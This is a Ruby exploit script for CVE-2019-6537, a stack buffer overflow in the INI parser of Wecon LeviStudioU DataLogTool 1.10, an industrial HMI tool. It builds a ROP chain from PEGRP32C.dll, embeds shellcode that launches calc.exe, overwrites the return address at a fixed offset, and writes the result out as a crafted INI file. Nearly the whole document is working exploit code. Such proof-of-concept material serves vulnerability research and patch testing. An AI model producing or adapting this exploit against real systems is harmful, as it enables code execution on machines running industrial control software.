#!/usr/bin/env ruby
# Wecon LeviStudioU DataLogTool INI Parser Stack-based Buffer Overflow
# DataLogTool Version 1.10 
# all rop and pivot from PEGRP32C.dll
require 'rex'

rop = 
[
  0x101bf5f4, 
  0x1020c938,
  0x101ddfc7, 
  0x10074c48, 
  0x101f19d8, 
  0x101b149b,
  0x101d0844, 
  0xffffffff,  
  0x101bfb73, 
  0x101bfb73, 
  0x101bfab2, 
  0x8afd96bf,
  0x101c511c, 
  0x1002ce9a, 
  0x101bf7fa, 
  0xffffffc0,
  0x101dc6c3, 
  0x101baaea, 
  0x10021840, 
  0x10021841,
  0x101bf7fa, 
  0x96969696,
  0x10114ec7, 
].pack("V*")

# calc.exe
payload =
"\x81\xc4\x54\xf2\xff\xff" + 
"\xd9\xc8\xd9\x74\x24\xf4\x58\xbe\x8b\xe1\xce\xfa\x31\xc9" +
"\xb1\x31\x83\xc0\x04\x31\x70\x14\x03\x70\x9f\x03\x3b\x06" +
"\x77\x41\xc4\xf7\x87\x26\x4c\x12\xb6\x66\x2a\x56\xe8\x56" +
"\x38\x3a\x04\x1c\x6c\xaf\x9f\x50\xb9\xc0\x28\xde\x9f\xef" +
"\xa9\x73\xe3\x6e\x29\x8e\x30\x51\x10\x41\x45\x90\x55\xbc" +
"\xa4\xc0\x0e\xca\x1b\xf5\x3b\x86\xa7\x7e\x77\x06\xa0\x63" +
"\xcf\x29\x81\x35\x44\x70\x01\xb7\x89\x08\x08\xaf\xce\x35" +
"\xc2\x44\x24\xc1\xd5\x8c\x75\x2a\x79\xf1\xba\xd9\x83\x35" +
"\x7c\x02\xf6\x4f\x7f\xbf\x01\x94\x02\x1b\x87\x0f\xa4\xe8" +
"\x3f\xf4\x55\x3c\xd9\x7f\x59\x89\xad\xd8\x7d\x0c\x61\x53" +
"\x79\x85\x84\xb4\x08\xdd\xa2\x10\x51\x85\xcb\x01\x3f\x68" +
"\xf3\x52\xe0\xd5\x51\x18\x0c\x01\xe8\x43\x5a\xd4\x7e\xfe" +
"\x28\xd6\x80\x01\x1c\xbf\xb1\x8a\xf3\xb8\x4d\x59\xb0\x37" +
"\x04\xc0\x90\xdf\xc1\x90\xa1\xbd\xf1\x4e\xe5\xbb\x71\x7b" +
"\x95\x3f\x69\x0e\x90\x04\x2d\xe2\xe8\x15\xd8\x04\x5f\x15" +
"\xc9\x66\x3e\x85\x91\x46\xa5\x2d\x33\x97"

buff = Rex::Text.rand_text_alpha_upper(6024)
buff[388, 4] = [0x101bd439].pack('V')
buff[1228, rop.size + payload.size] = rop + payload.force_encoding("ASCII-8BIT")

ini = %Q|
[LogName]
Name=#{buff}
[Remark]
RemarkText=
[Channel]
TotolChannel=1
ShowNum=1
[Display]
DeskColor=29
GridType=0
[YAxis]
YAxisType=0
ManualMax=100.000000
ManualMin=0.000000
[YGrid]
YGridIntervalType=1
YGridInterval=4.000000
CH1=18760418657

[18760418657]
Id=0
bShow=1
ShowId=0
LineColor=0
LineType=0
|

fd = File.new("WECON-CVE-2019-6537-DataLogTool.ini", "wb")
fd.write(ini)
fd.close
